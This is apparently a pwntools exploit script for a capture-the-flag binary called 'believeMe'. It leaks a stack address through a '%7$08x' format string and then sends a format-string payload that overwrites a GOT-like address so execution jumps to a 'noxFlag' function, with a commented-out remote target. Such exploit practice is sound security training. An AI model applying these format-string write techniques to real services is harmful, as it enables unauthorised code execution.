#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="i386", os="linux", endian="little")
context.log_level="DEBUG"


class Pwn:
    def __init__(self):
        self.p = None
        self.e = ELF("./believeMe")

    def start_binary(self):
        self.p = process("./believeMe")
#        self.p = remote("18.223.228.52", 13337)
        self.p.recvuntil("????")
        self.p.recv()

    def leak_stack(self):
        self.p.sendline("%7$08x")
        data=self.p.recv()
        print "[*] Leak stack address: "+hex(int(data, 16))
        return int(data, 16)

    def pwn_binary(self):
        self.start_binary()

        leak_stack=self.leak_stack()
        self.p.close()

        self.start_binary()
        pause()

        ret_addr=leak_stack-0xa8
        canary_addr=leak_stack-0xb6
        self.p.sendline(fmtstr_payload(9, {
            0x08049f28: self.e.symbols["noxFlag"],
        }, write_size="short"))

        self.p.recv()
        self.p.recv()
        print self.p.recv()
        self.p.interactive()
        self.p.close()


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
